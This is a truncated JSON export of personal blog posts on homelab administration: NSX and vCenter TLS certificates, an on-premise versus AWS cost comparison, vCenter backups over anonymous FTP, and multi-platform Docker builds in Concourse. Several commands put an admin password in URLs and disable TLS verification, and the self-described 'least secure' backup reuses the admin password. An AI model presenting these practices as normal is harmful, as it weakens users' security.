[{"content":"Quickstart 0. Create Key and CSR First, create your key and your CSR (Certificate Signing Request). In the following example, we create a CSR for our NSX Manager, \u0026ldquo;nsx.nono.io\u0026rdquo;. Don\u0026rsquo;t be tempted to use elliptic-curve cryptography even though that\u0026rsquo;s what all the cool kids are doing these days. Instead, stick with the tried-and-true RSA.\n# change \u0026#34;nsx.nono.io\u0026#34; to be your NSX Manager\u0026#39;s fully-qualified domain name: export CN=nsx.nono.io # \u0026#34;CN\u0026#34; is the abbreviation for \u0026#34;Common Name\u0026#34; openssl genrsa -out ${CN}.key 2048 openssl req \\ -new \\ -key ${CN}.key \\ -out ${CN}.csr \\ -sha256 \\ -nodes \\ -subj \u0026#34;/C=US/ST=California/L=San Francisco/O=nono.io/CN=${CN}/emailAddress=brian.cunnie@gmail.com\u0026#34; \\ -config \u0026lt;(cat \u0026lt;\u0026lt;EOF [ req ] distinguished_name = req_distinguished_name req_extensions = req_ext [ req_distinguished_name ] [ req_ext ] subjectAltName = @alt_names [alt_names] DNS.1 = ${CN} EOF ) You\u0026rsquo;ll have two files, nsx.nono.io.key and nsx.nono.io.csr.\nExtra credit: double-check your CSR at SSLShopper. It\u0026rsquo;s important that your \u0026ldquo;Subject Alternative Names\u0026rdquo; matches your hostname (e.g. \u0026ldquo;nsx.nono.io\u0026rdquo;).\n1. Acquire Your Certificate Acquire a certificate for your host from a Commercial CA. In our example, we acquired a certificate for our host nsx.nono.io from SSls.com, and we purchased their least-expensive offering, the PositiveSSL 1 domain Comodo SSL.\n[We do not endorse either SSLs.com or Sectigo (formerly Comodo); We encourage you to use the reseller and the Certificate Authority (CA) with which you are most comfortable. We have no financial interest in either SSLs.com or Sectigo].\nSSLs.com sends us two files, nsx.nono.io.crt and nsx.nono.io.ca-bundle\n2. Create Your Certificate + CA Bundle You\u0026rsquo;ll need to catenate your certificate onto its CA bundle (certificate chain) onto the secret key. We did the following:\ncat ${CN//./_}.crt \\ ${CN//./_}.ca-bundle \\ \u0026gt; ${CN}.chain.crt 3 Sectigo / Comodo Users: Fix Your Root Certificate If you bought your certificate from Sectigo, your CA Bundle probably has a \u0026ldquo;bad\u0026rdquo; root certificate. \u0026ldquo;Bad\u0026rdquo; means a root certificate that has been cross-signed with another root certificate that was self-signed with the weak SHA-1 algorithm. NSX Manager will prevent you from setting this certificate. Here\u0026rsquo;s how to fix.\nEdit your .chain.crt file (e.g. nsx.nono.io.chain.crt) Extract the bottom-most certificate to /tmp/bad-root.pem Check if it\u0026rsquo;s a cross-signed root certificate by seeing if the issuer is different than the subject: openssl x509 -text -noout \u0026lt; /tmp/bad-root.pem | egrep -i \u0026#34;issuer|subject\u0026#34; Issuer: C = GB, ST = Greater Manchester, L = Salford, O = Comodo CA Limited, CN = AAA Certificate Services Subject: C = US, ST = New Jersey, L = Jersey City, O = The USERTRUST Network, CN = USERTrust RSA Certification Authority We confirm the CN of the Subject, \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, is different than the CN of the Issuer, \u0026ldquo;AAA Certificate Services\u0026rdquo; We take the CN of the Subject, in the above example \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, and search for it on https://crt.sh We see several entries, but the only one we\u0026rsquo;re interested in is the one whose )Issuer Name contains \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, we click on its link: hhttps://crt.sh/?id=1199354 Click on \u0026ldquo;Download Certificate: PEM\u0026rdquo;, save it to /tmp/good-root.pem Edit your .chain.crt file, replacing the bad root certificate with the good root certificate. 4. Import Your Certificate + Bundle and Key System → Certificates → Certificates → Import → Certificate Name: Use your NSX managers FQDN, e.g. nsx.nono.io Service Certificate: No Certificate Contents: upload your combined certificate + bundle, e.g. nsx.nono.io.chain.crt Private key: upload your private key, e.g. nsx.nono.io.key If you get an error, \u0026ldquo;Error: Certificate chain validation failed. Make sure a valid chain is provided in order leaf,intermediate,root certificate. (Error code: 2076)\u0026rdquo;, it probably means you didn\u0026rsquo;t fix your root certificate.\nIf you get an error \u0026ldquo;Error: Invalid PEM data received for private key. (Error code: 2004)\u0026rdquo;, it probably means you tried to use ECC instead of RSA even though I warned you not to.\nWe\u0026rsquo;ll need to Find the certificate id. In our case it\u0026rsquo;s 72483a4e-e15a-425e-be40-3c96c0b84a5d:\ncurl -k \u0026#39;https://a:Admin!23Admin@nsx.nono.io/api/v1/trust-management/certificates\u0026#39; | \\ jq -r \u0026#34;.results[] | select(.display_name == \\\u0026#34;${CN}\\\u0026#34;) | .id\u0026#34; Validate the certificate (make sure the \u0026ldquo;status\u0026rdquo; is \u0026ldquo;OK\u0026rdquo;\u0026quot;):\ncurl -k \u0026#39;https://a:Admin!23Admin@nsx.nono.io/api/v1/trust-management/certificates/72483a4e-e15a-425e-be40-3c96c0b84a5d?action=validate\u0026#39; The above curl should return the following:\n{ \u0026#34;status\u0026#34; : \u0026#34;OK\u0026#34; } However, if the curl command returns the following error message, it means you insisted on using an ECC key in spite of my warning, but you thought you were smarter and trimmed the \u0026ldquo;\u0026mdash;\u0026ndash;BEGIN EC PARAMETERS\u0026mdash;\u0026ndash;\u0026rdquo; from your key to get past the earlier error, and now finally you see the error of your ways and are ready to throw in the towel and use an RSA key:\n{ \u0026#34;status\u0026#34; : \u0026#34;REJECTED\u0026#34;, \u0026#34;error_message\u0026#34; : \u0026#34;Certificate was rejected: KeyUsage does not allow key encipherment\u0026#34; } Tech note: ECC keys use key agreement instead of key encipherment, which is a \u0026ldquo;more secure way to protect session keys and include features such as forward secrecy\u0026rdquo;, but NSX insists on key encipherment, and, by corollary, insists on RSA.\nFind the node id by query the API. Look for the node_uuid. Ours is ab413d42-5050-2404-b8b8-bce8b244d217\ncurl -k \u0026#39;https://a:Admin!23Admin@nsx.nono.io/api/v1/node\u0026#39; \\ | jq -r \u0026#39;.node_uuid\u0026#39; Now we\u0026rsquo;re ready to set our certificate\ncurl -k \\ -X POST \\ \u0026#39;https://a:Admin!23Admin@nsx.nono.io/api/v1/trust-management/certificates/72483a4e-e15a-425e-be40-3c96c0b84a5d?action=apply_certificate\u0026amp;service_type=API\u0026amp;node_id=ab413d42-5050-2404-b8b8-bce8b244d217\u0026#39; References NSX API Reference NSX-T Data Center Administration Guide: Importing and Replacing Certificates ","permalink":"https://blog.nono.io/post/nsx_tls/","summary":"Quickstart 0. Create Key and CSR First, create your key and your CSR (Certificate Signing Request). In the following example, we create a CSR for our NSX Manager, \u0026ldquo;nsx.nono.io\u0026rdquo;. Don\u0026rsquo;t be tempted to use elliptic-curve cryptography even though that\u0026rsquo;s what all the cool kids are doing these days. Instead, stick with the tried-and-true RSA.\n# change \u0026#34;nsx.nono.io\u0026#34; to be your NSX Manager\u0026#39;s fully-qualified domain name: export CN=nsx.nono.io # \u0026#34;CN\u0026#34; is the abbreviation for \u0026#34;Common Name\u0026#34; openssl genrsa -out ${CN}.","title":"How to Install a TLS Certificate on NSX 4.1"},{"content":"* If you don\u0026rsquo;t count the amount of time spent maintaining the on-premise equipment.\nAbstract My 48-VM (virtual machine) homelab configuration costs me approximately $430/month in hardware, electricity, virtualization software, and internet, but an equivalent configuration on AWS (Amazon Web Services) would cost $1,660/month (almost four times as expensive)!\nDisclosures:\nI work for VMware, which sells on-premise virtualization software (i.e. vSphere). I didn\u0026rsquo;t put a dollar value on the time spent maintaining on-premise because I had a hard time assigning a dollar value. For one thing, I don\u0026rsquo;t track how much time I spend maintaining my on-premise equipment. For another, I enjoy maintaining on-premise equipment, so it doesn\u0026rsquo;t feel like work. Shortcomings of On-Premise Time and Effort: Before you leap into on-premise, you need to ask yourself the following, \u0026ldquo;Am I interested, and do I have the time, to maintain my own infrastructure?\u0026rdquo; If you like swapping out broken hard drives, troubleshooting failed power supplies, creating VLANs, building firewalls, configuring backups, and flashing BIOS—if you like getting your hands dirty—then on-premise is for you. Only one IPv4 address: This is a big drawback. Who gets the sole IPv4 (73.189.219.4) address\u0026rsquo;s HTTPS port—the Kubernetes cluster or the Cloud Foundry foundation? In my case, the Cloud Foundry foundation won that battle. On the IPv6 front there\u0026rsquo;s no scarcity: Xfinity has allocated me 2601:646:100:69f0/60 (eight /64 subnets!). Poor upload speed: Although my Xfinity download speed at 1.4 Gbps can rival the cloud VMs\u0026rsquo;, the anemic 40 Mbps upload speed can\u0026rsquo;t. I don\u0026rsquo;t host large files on my on-premise home lab. This may not be a problem if your internet connection has symmetric speeds (e.g. fiber). Scalability: I can\u0026rsquo;t easily scale up my home lab. For example, my 15 amp outlet won\u0026rsquo;t support more than what it already has (2 ESXi hosts, 1 TrueNAS ZFS fileserver, two switches, an access point, a printer). Similarly, my modestly-sized San Francisco apartment\u0026rsquo;s closet doesn\u0026rsquo;t have room to accommodate additional hardware. Widespread outages: When I upgraded my TrueNAS ZFS fileserver that supports the VMs, I had to power-off every single VM. Only then could I safely upgrade the fileserver. Ground-up Rebuilds: One time I made the mistake of not powering down my 48 VMs before rebooting my fileserver, and I spent a significant portion of my winter break recovering corrupted VMs (re-installing vCenter, rebuilding my Unifi console from scratch). How I Calculated the AWS Costs First, I pulled a list of my VMs and their hardware configuration (number of CPUs (cores), amount of RAM (Random Access Memory)) I used the following govc command:\nexport GOVC_USERNAME=administrator@vsphere.local GOVC_PASSWORD=\u0026#39;some-password\u0026#39; GOVC_URL=vcenter-80.nono.io govc ls -json \u0026#39;/*/vm/*\u0026#39; | jq -r \u0026#39;.elements[].Object.Config | select(.Name == null | not) | {Name, \u0026#34;NumCPU\u0026#34;: .Hardware[\u0026#34;NumCPU\u0026#34;], \u0026#34;MemoryMB\u0026#34;: .Hardware[\u0026#34;MemoryMB\u0026#34;] } | join(\u0026#34;\\t\u0026#34;)\u0026#39; The output is a tab-separated file with three columns: VM Name, cores, RAM. Here\u0026rsquo;s a typical line from my Ubuntu Jammy-based VM with 4 cores and 2GiB of RAM:\njammy.nono.io\t4\t2048 I imported the data into a Google Sheet, and then found the closest available instance in the AWS region us-east-1 using the following criteria:\nUse the closest instance type, but round down in AWS\u0026rsquo;s favor (this post isn\u0026rsquo;t a hit piece). For example, my biggest VM, nsx.nono.io, has 6 vCPUs and 24 GiB RAM, but AWS doesn\u0026rsquo;t offer that class of instance, so instead we drop down to the closest comparable instance, the t4g.xlarge with 4 vCPUs and 16 GiB of RAM. When there are multiple instance types which match the hardware configuration, use the instance type most favorable (cheapest) to AWS. As a result, many of the instances are Graviton-based. Graviton is AWS\u0026rsquo;s custom implementation of the ARM (Advanced RISC Machines) architecture, and its instances cost less than an equivalent x86-based instance. For example, for a 2-vCPU 4 GiB instance, we use the t4g.medium instance type (Graviton-based, as noted by the \u0026ldquo;g\u0026rdquo;) which costs $15.40 per month and which is 19% percent cheaper than an equivalent t3.medium at $19.05 per month. Use a 1-year Reserved Instance pricing instead of On-Demand pricing, which again favors AWS. For example, a t4g.medium with a 1-year reservation costs $15.40 per month which is 37% cheaper than an On-Demand which costs $24.54. I don\u0026rsquo;t use the 3-year Reserved Instance pricing because I used it once and was trapped in an instance type I didn\u0026rsquo;t want for two years. Machine Name Num vCPU RAM (MiB) AWS Instance 1 yr reserved instance $/mo unifi.nono.io 1 1024 t2.micro 5.26 vm-7f223465-fee6-4cce-bd36-e208ab134eef 1 1024 t2.micro 5.26 vm-b2dff011-7c0a-4b9a-8c40-d6c6b8a806e6 1 1024 t2.micro 5.26 vm-c685c9f0-b221-4369-b021-11657db9d242 1 1024 t2.micro 5.26 cc-worker_cf_4565d3c15290 1 4096 m6g.medium 17.59 controller-0.nono.io 1 4096 m6g.medium 17.59 controller-1.nono.io 1 4096 m6g.medium 17.59 controller-2.nono.io 1 4096 m6g.medium 17.59 credhub_cf_cb824be566b2 1 4096 m6g.medium 17.59 doppler_cf_9d4b65e4b9fa 1 4096 m6g.medium 17.59 log-api_cf_6f75cfc1d54d 1 4096 m6g.medium 17.59 nats_cf_f5ba1300f093 1 4096 m6g.medium 17.59 scheduler_cf_6b106f0f539a 1 4096 m6g.medium 17.59 tcp-router_cf_6a78efed748e 1 4096 m6g.medium 17.59 worker-0.nono.io 1 4096 m6g.medium 17.59 worker-1.nono.io 1 4096 m6g.medium 17.59 worker-2.nono.io 1 4096 m6g.medium 17.59 om.tas.nono.io 1 8192 r6g.medium 23.21 api_cf_19bd0834f739 2 2048 t4g.small 7.67 database_cf_740768a383a0 2 2048 t4g.small 7.67 diego-api_cf_645d9f6fed02 2 2048 t4g.small 7.67 singleton-blobstore_cf_469b8edcd414 2 2048 t4g.small 7.67 uaa_cf_358f9461cbf2 2 2048 t4g.small 7.67 vm-075fc31a-db73-42fc-9af0-b4755e24b4df 2 4096 t4g.medium 15.40 vm-1a2fef42-b2ba-4714-a1c6-6fe856a1dde6 2 8192 t4g.large 30.73 vm-a5887419-c158-4a2e-afca-7dfc59f63a3e 2 8192 t4g.large 30.73 vm-e19d536a-8d38-48dc-a57b-8f8eeaa664a1 2 8192 t4g.large 30.73 jammy.nono.io 4 2048 t4g.small 7.67 haproxy_cf_239724625ef9 4 4096 t4g.medium 15.40 minikube.nono.io 4 4096 t4g.medium 15.40 router_cf_6d1ae08baa9b 4 4096 t4g.medium 15.40 router_cf_d060cf838699 4 4096 t4g.medium 15.40 edge-0 4 8192 c6g.xlarge 62.56 edge-1 4 8192 c6g.xlarge 62.56 worker_sslipio_7308d8fd0554 4 8192 c6g.xlarge 62.56 diego-cell_cf_2f95c43dcdc1 4 16384 t4g.xlarge 61.54 diego-cell_cf_7e3d791ed94c 4 16384 t4g.xlarge 61.54 fed.nono.io 4 16384 t4g.xlarge 61.54 isolated-diego-cell_cf_c3cd3c843ee8 4 16384 t4g.xlarge 61.54 log-cache_cf_2af63a960266 4 16384 t4g.xlarge 61.54 vm-317535ae-3699-4b66-b679-cfa26ecaee4d 4 16384 t4g.xlarge 61.54 vm-d3143c15-9cf2-45e7-b08c-e6bea0f6065d 4 16384 t4g.xlarge 61.54 windows2019-cell_cf_61eda5c3d90d 4 16384 t4g.xlarge 61.54 windows2019-cell_cf_d0340ccccfb3 4 16384 t4g.xlarge 61.54 nesxi-0.nono.io 4 32768 r6g.xlarge 92.71 nesxi-1.nono.io 4 32768 r6g.xlarge 92.71 nesxi-2.nono.io 4 32768 r6g.xlarge 92.71 nesxi-template 4 32768 r6g.xlarge 92.71 nsx.nono.io 6 24576 t4g.xlarge 61.54 TOTAL 1,662.05 How I Calculated the On-Premise Monthly Cost I added up the hardware I\u0026rsquo;ve purchased, then divided by the number of months it has been in use to determine its monthly cost. Admittedly this is not a GAAP-approved (generally accepted accounting principles) method of assigning a monthly cost, but I\u0026rsquo;m an engineer not an accountant.\nHardware Date Purchased One-time Cost $/Month Fileserver: iSCSI TrueNAS server custom build 11/12/2014 2,434.50 24.58 ESXi host: Supermicro X10SDV-8C-TLNF4+ Intel Xeon D-1537 128 GiB 9/14/2017 2,287.68 35.20 ESXi host: Supermicro X10SDV-8C-TLNF4+ Intel Xeon D-1537 128 GiB 9/26/2017 2,285.13 35.38 Network switch: Qnap QSW-1208-8C-US 12-Port unmanaged 10 Gbe Switch 9/27/2018 828.07 15.75 ESXi host: Supermicro X11SDV-8C+-TLN2F-B Intel Xeon D-2141 256 GiB 3/27/2019 2,430.52 52.13 Network Switch: Ubiquiti 24-port Gbe + 2 x 10 Gbe uplink 7/10/2019 649.92 15.05 Network cable modem: ARRIS SURFboard S33 10/14/2021 184.64 11.54 Network Firewall: Supermicro A2SDi-H-TF-B 11/25/2021 1,063.11 72.71 Network Switch: Ubiquiti Switch Flex XG 10/15/2021 324.79 20.34 Electricity: assume half of latest bill, 117.24 58.62 Internet (Comcast $70/mo 1.2Gpbs/40Mbps) 70.00 Virtualization Software (VMUG advantage, $200/yr) 16.67 TOTAL 427.98 Why I didn\u0026rsquo;t Include the Cost of Storage (Disks) The costs of disk was overshadowed by the cost of cores and RAM, and I was loath to include another metric. For example, a t4g.medium instance costs $15.40/month, and adding a 30 GiB gp3 EBS (Elastic Block Store) adds a paltry $2.40 (15% increase).\nThis decision to overlook the cost of disk plays in AWS\u0026rsquo;s favor.\n\u0026ldquo;Why Do You Hate the Cloud?\u0026rdquo; I don\u0026rsquo;t hate the cloud—I love the cloud! I maintain personal servers on AWS, Azure, Digital Ocean, Google Cloud Platform (GCP) (a GKE cluster!), and Hetzner, and I\u0026rsquo;ve had them for years. And this is a good excuse to list them all:\nName IaaS (Infrastructure as a Service) Purpose ns-aws AWS (Ubuntu, dual-stack) DNS, NTP, web ns-azure Azure (Ubuntu) DNS, NTP, web ns-gce GCP (GKE, kubernetes) DNS, NTP, Vault, CI nono.io Hetzner (FreeBSD, dual-stack) DNS, NTP ns-digitalocean Digital Ocean (FreeBSD, dual-stack) DNS, NTP ","permalink":"https://blog.nono.io/post/on-premise_vs_cloud/","summary":"* If you don\u0026rsquo;t count the amount of time spent maintaining the on-premise equipment.\nAbstract My 48-VM (virtual machine) homelab configuration costs me approximately $430/month in hardware, electricity, virtualization software, and internet, but an equivalent configuration on AWS (Amazon Web Services) would cost $1,660/month (almost four times as expensive)!\nDisclosures:\nI work for VMware, which sells on-premise virtualization software (i.e. vSphere). I didn\u0026rsquo;t put a dollar value on the time spent maintaining on-premise because I had a hard time assigning a dollar value.","title":"On-premise is Almost Four Times Cheaper * than the Cloud"},{"content":"We\u0026rsquo;re going to set up automated backups for a vCenter which we were forced to rebuild over the winter break because the unexpected reboot of the file server hosting the iSCSI datastore backing the vCenter\u0026rsquo;s disk drive caused unrecoverable database corruption, and we had no backups.\nLog into your TrueNAS server via its web interface, e.g. https://nas.nono.io Browse to \u0026ldquo;Services\u0026rdquo; Start FTP (by toggling the \u0026ldquo;Running\u0026rdquo; slider) and configure it to start automatically Remember to start the FTP service and configure it to start automatically. Once that\u0026rsquo;s done, you can configure it by clicking on the ✎ icon in the Actions column.\nClick on the ✎ (pencil icon) in the actions tab to configure FTP Bump \u0026ldquo;Connections\u0026rdquo; to 20 to avoid the error on the TrueNAS console, \u0026ldquo;proftpd[63793]: 127.0.0.1 (10.9.9.128[10.9.9.128]) - Connection refused (MaxConnectionsPerHost 2)\u0026rdquo; Check \u0026ldquo;Allow Anonymous Login\u0026rdquo; to enable anonymous FTP Browse to the path where you want the backups stored Remember to bump the number of connections 2 → 20, enable anonymous FTP, and browse to the directory where you want your backups stored.\nLet\u0026rsquo;s configure the vCenter to backup to the TrueNAS server via anonymous FTP:\nBrowse to your vCenter Server Appliance Web Console (VAMI) on port 5480, e.g. https://vcenter-80.nono.io:5480 Log in Browse to \u0026ldquo;Backup\u0026rdquo; Click \u0026ldquo;Activate\u0026rdquo; Click \u0026ldquo;Edit\u0026rdquo; Type the backup location, protocol (FTP) followed by the TrueNAS server\u0026rsquo;s hostname, e.g. \u0026ldquo;ftp://nas.nono.io\u0026rdquo; Username: \u0026ldquo;ftp\u0026rdquo; Password: \u0026ldquo;administrator@vsphere.local\u0026rdquo;. Anonymous FTP expects this to be an identifier, usually an email address (by convention). Don\u0026rsquo;t put a real password here because it may appear in the logs Encrypt backup: enter a password to encrypt the backup; we use the same password as our \u0026ldquo;administrator@vsphere.local\u0026rdquo; account so we can remember it. Yes, we know that by setting a password here we\u0026rsquo;re no longer the \u0026ldquo;The Least Secure Way\u0026rdquo; to backup our vCenter. What can we say? We wanted a catchy title We choose to retain 60 backups. Choose as many as you\u0026rsquo;d like Click \u0026ldquo;Save\u0026rdquo; Click \u0026ldquo;Backup Now\u0026rdquo; to test our configuration Check \u0026ldquo;Use backup location and user name from backup schedule.\u0026rdquo; Enter the encryption password Click \u0026ldquo;Start\u0026rdquo;; make sure the backup successfully completes Security Considerations Don\u0026rsquo;t back up your vCenter this way unless you don\u0026rsquo;t care about security. Don\u0026rsquo;t use FTP, certainly not anonymous FTP. Use one of the more secure protocols, e.g. FTPS, HTTPS, SFTP, SMB.\n","permalink":"https://blog.nono.io/post/backup_vcenter_w_truenas/","summary":"We\u0026rsquo;re going to set up automated backups for a vCenter which we were forced to rebuild over the winter break because the unexpected reboot of the file server hosting the iSCSI datastore backing the vCenter\u0026rsquo;s disk drive caused unrecoverable database corruption, and we had no backups.\nLog into your TrueNAS server via its web interface, e.g. https://nas.nono.io Browse to \u0026ldquo;Services\u0026rdquo; Start FTP (by toggling the \u0026ldquo;Running\u0026rdquo; slider) and configure it to start automatically Remember to start the FTP service and configure it to start automatically.","title":"The Least Secure Way to Back Up vCenter 8.0 with TrueNAS 13.0"},{"content":"Concourse CI/CD (continuous integration/continuous delivery) can create multi-platform Docker images. This blog post describes how.\nA multi-platform docker image is one that contains \u0026ldquo;variants for different architectures\u0026rdquo;.\nDocker images are often created for a single architecture (\u0026ldquo;instruction set architecture\u0026rdquo; or \u0026ldquo;ISA\u0026rdquo;), typically Intel\u0026rsquo;s/AMD\u0026rsquo;s x86-64, but with the advent of ARM64-based offerings such as AWS\u0026rsquo;s Graviton and Apple\u0026rsquo;s M1/M2, It\u0026rsquo;s becoming more common to build multi-platform images to avoid the heavy emulation performance penalty (typically \u0026gt;10x) when running an image on a different architecture. Multi-platform images enable a developer, for example, to run a container just as fast on their Apple M1 laptop as their GCP (Google Cloud Platform) Kubernetes cluster.\nQuick Start Make sure you\u0026rsquo;re on Concourse 7.9 or later; it has the registry-image resource necessary to create multi-platform images.\nCreate a Concourse resource, \u0026ldquo;multi-platform-docker-image\u0026rdquo;. This is the Docker image you\u0026rsquo;ll be building. Using the example below, make the following changes:\nreplace cunnie/multi-platform with the name of the multi-platform Docker image that you intend to create. replace username: cunnie with your Docker username. replace ((docker_token)) with your Docker hub access token resources: - name: multi-platform-docker-image type: registry-image icon: docker source: repository: cunnie/multi-platform # ← Replace with the name of your Docker image username: cunnie # ← Replace with your Docker Hub username password: ((docker_token)) # ← Replace with your Docker Hub token (or password) tag: latest Create a job to build the Docker image using the following as an example. Make the following changes:\nreplace CONTEXT: deployments/multi-platform-docker with the path to your Dockerfile\u0026rsquo;s location. In this example, I have a Concourse input resource \u0026ldquo;deployments\u0026rdquo;, and it has a subdirectory \u0026ldquo;multi-platform-docker/\u0026rdquo;, and that subdirectory has a \u0026ldquo;Dockerfile\u0026rdquo;. Note:\nIMAGE_PLATFORM defines the platforms to build. If you\u0026rsquo;re not sure, use linux/arm64,linux/amd64 OUTPUT_OCI: true is required for multi-platform image: image/image is required for OCI output jobs: - name: build-and-push-multi-platform-docker-image plan: - get: deployments trigger: true - task: build-image-task privileged: true config: platform: linux image_resource: type: registry-image source: repository: concourse/oci-build-task inputs: - name: deployments outputs: - name: image params: CONTEXT: deployments/multi-platform-docker IMAGE_PLATFORM: linux/arm64,linux/amd64 OUTPUT_OCI: true run: path: build - put: multi-platform-docker-image params: image: image/image Putting it all together, we have the following:\nThe Concourse pipeline The Concourse pipeline definition (YAML) The Dockerfile The generated Docker image The resulting Docker image is simple: it prints out the architecture of the underlying kernel (i.e. \u0026ldquo;aarch64\u0026rdquo; for ARM, \u0026ldquo;x86_64\u0026rdquo; for Intel) and then exits. See for yourself:\ndocker run -it --rm cunnie/multi-platform Gotchas Update your Concourse pipelines to use the new resource registry-image instead of the old, deprecated docker-image, otherwise your pipelines will pull the old (pre-multi-platform) image, and you\u0026rsquo;ll be sad.\njobs: name: unit plan: - get: sslip.io trigger: true - config: image_resource: source: repository: cunnie/fedora-golang-bosh - type: docker-image + type: registry-image Advanced Topics If your Docker image needs to be built slightly differently for different platforms, use the TARGETARCH environment variable. In the following Dockerfile snippet, we use the TARGETARCH to download and install tha Golang-compiled executables for the appropriate architecture:\nARG TARGETARCH # amd64, arm64 (so I can run on AWS graviton2) RUN curl -L https://github.com/cunnie/sslip.io/releases/download/2.6.1/sslip.io-dns-server-linux-$TARGETARCH \\ -o /usr/sbin/sslip.io-dns-server; \\ chmod 755 /usr/sbin/sslip.io-dns-server Corrections \u0026amp; Updates 2023-04-18\nGotcha: update your pipelines to use the new registry-image instead of the old docker-image, lest your pipelines don\u0026rsquo;t pull the new image.\n2022-12-04\nI updated the post to require Concourse 7.9, which allowed me to remove the custom Concourse resource type.\n","permalink":"https://blog.nono.io/post/multi-platform_docker_images_with_concourse/","summary":"Concourse CI/CD (continuous integration/continuous delivery) can create multi-platform Docker images. This blog post describes how.\nA multi-platform docker image is one that contains \u0026ldquo;variants for different architectures\u0026rdquo;.\nDocker images are often created for a single architecture (\u0026ldquo;instruction set architecture\u0026rdquo; or \u0026ldquo;ISA\u0026rdquo;), typically Intel\u0026rsquo;s/AMD\u0026rsquo;s x86-64, but with the advent of ARM64-based offerings such as AWS\u0026rsquo;s Graviton and Apple\u0026rsquo;s M1/M2, It\u0026rsquo;s becoming more common to build multi-platform images to avoid the heavy emulation performance penalty (typically \u0026gt;10x) when running an image on a different architecture.","title":"Creating Multi-Platform Docker Images with Concourse"},{"content":" Quickstart First, create your key and your CSR (Certificate Signing Request). In the following example, we are creating a CSR for our vCenter host, \u0026ldquo;vcenter-80.nono.io\u0026rdquo;:\nCN=vcenter-80.nono.io # \u0026#34;CN\u0026#34; is the abbreviation for \u0026#34;Common Name\u0026#34; openssl genrsa -out $CN.key 3072 openssl req \\ -new \\ -key $CN.key \\ -out $CN.csr \\ -sha256 \\ -subj \u0026#34;/C=US/ST=California/L=San Francisco/O=nono.io/OU=homelab/CN=${CN}/emailAddress=brian.cunnie@gmail.com\u0026#34; \\ -config \u0026lt;(cat \u0026lt;\u0026lt;EOF [ req ] distinguished_name = req_distinguished_name req_extensions = req_ext [ req_distinguished_name ] [ req_ext ] subjectAltName = @alt_names [alt_names] DNS.1 = ${CN} EOF ) You\u0026rsquo;ll have two files, vcenter-80.nono.io.key and vcenter-80.nono.io.csr.\nExtra credit: double-check your CSR at GoDaddy. It\u0026rsquo;s important that your \u0026ldquo;Subject Alternative Names\u0026rdquo; matches your hostname (e.g. \u0026ldquo;vcenter-80.nono.io\u0026rdquo;).\nAcquire a certificate for your host from a Commercial CA. In our example, we acquired a certificate for our host vcenter-80.nono.io from SSls.com, and we purchased their least-expensive offering, the PositiveSSL 1 domain Comodo SSL.\n[We do not endorse either SSLs.com or Sectigo (formerly Comodo); We encourage you to use the reseller and the Certificate Authority (CA) with which you are most comfortable].\nSSLs.com sends us two files, vcenter-80.nono.io.crt and vcenter-80_nono_io.ca-bundle\nDo the following:\nOn your vCenter, navigate to Menu → Administration → Certificates → Certificate Management On the __MACHINE_CERT tile, click Actions, select Import and Replace Certificate. Select Replace with external CA certificate(requires private key). Machine SSL Certificate: click Browse File and select vcenter-80.nono.io.crt Chain of trusted root certificates: click Browse File and select vcenter-80_nono_io.ca-bundle Private Key: click Browse File and select vcenter-80.nono.io.key Click Replace. The change should take effect immediately, though it may take a minute for the website to be ready.\nIf you get errors such as \u0026ldquo;Please provide the strong signature algorithm certificate\u0026rdquo;, then refer to the Troubleshooting section below.\nTroubleshooting Error occurred while fetching tls: Provided certificate using the weak signature algorithm. Please provide the strong signature algorithm certificate\nI encountered this error, and to fix it I had to edit the CA Bundle (certificate chain) and replace a cross-signed root certificate with a self-signed root certificate. Here\u0026rsquo;s the CA Bundle that I used and that worked for me.\nTechnical details: Sectigo included a variant of their root certificate \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo; that had been cross-signed (issued) by the old \u0026ldquo;AAA Certificate Services\u0026rdquo; which had been self-signed with the weak SHA-1 algorithm, which Google and others have been deprecating since 2016.\nSectigo has another variant of that same root certificate \u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;, which is self-signed with the strong SHA-384 algorithm. This is the variant you should use.\nError occurred while fetching tls: The provided MACHINE_SSL certificate and provided private key are not valid.\nThe private key doesn\u0026rsquo;t match the certificate. Here are two ways it happened to me:\nI had vCenter generate the CSR on my behalf, and Sectigo took so long to issue the certificate that I thought something went wrong and I had vCenter generate a new CSR, not realizing that would trigger a new key, but by then Sectigo came through with the certificate for the old CSR, and I didn\u0026rsquo;t realize that the certificate didn\u0026rsquo;t match the key. I reissued the certificate, but the .zip file from Sectigo had the old vcenter-80.nono.io certificate in it. The fix: I cut-and-paste the one from the email content instead (I didn\u0026rsquo;t use the wrong certificate from the .zip file). How to Determine if a Certificate is a Self-Signed Certificate To determine if a certificate is a self-signed certificate, confirm the subject is the same as the issuer. In the following example, we use two common TLS command line tools (cfssl and openssl).\nFirst we use cfssl, whose output is JSON, which we pipe to jq to extract the Common Name of the issuer and subject and the signature algorithm. We choose the problematic certificate (\u0026ldquo;USERTrust RSA Certification Authority\u0026rdquo;) that has been signed by a root cert that in turn is self-signed with the weak SHA-1 algorithm (\u0026ldquo;AAA Certificate Services\u0026rdquo;):\ncurl https://crt.sh/?d=1282303295 | \\ cfssl certinfo -cert - | \\ jq -r \u0026#39;{\u0026#34;Issuer\u0026#34;: .issuer.common_name, \u0026#34;Subject\u0026#34;: .subject.common_name, \u0026#34;Signature Algorithm\u0026#34;: .sigalg }\u0026#39; produces:\n{ \u0026#34;Issuer\u0026#34;: \u0026#34;AAA Certificate Services\u0026#34;, \u0026#34;Subject\u0026#34;: \u0026#34;USERTrust RSA Certification Authority\u0026#34;, \u0026#34;Signature Algorithm\u0026#34;: \u0026#34;SHA384WithRSA\u0026#34; } Now let\u0026rsquo;s look at its issuer\u0026rsquo;s (\u0026ldquo;AAA Certificate Services\u0026rdquo;) certificate, which is a root certificate, and which is self-signed with the weak SHA-1 algorithm:\ncurl https://crt.sh/?d=331986 | \\ cfssl certinfo -cert - | \\ jq -r \u0026#39;{\u0026#34;Issuer\u0026#34;: .issuer.common_name, \u0026#34;Subject\u0026#34;: .subject.common_name, \u0026#34;Signature Algorithm\u0026#34;: .sigalg }\u0026#39; produces:\n{ \u0026#34;Issuer\u0026#34;: \u0026#34;AAA Certificate Services\u0026#34;, \u0026#34;Subject\u0026#34;: \u0026#34;AAA Certificate Services\u0026#34;, \u0026#34;Signature 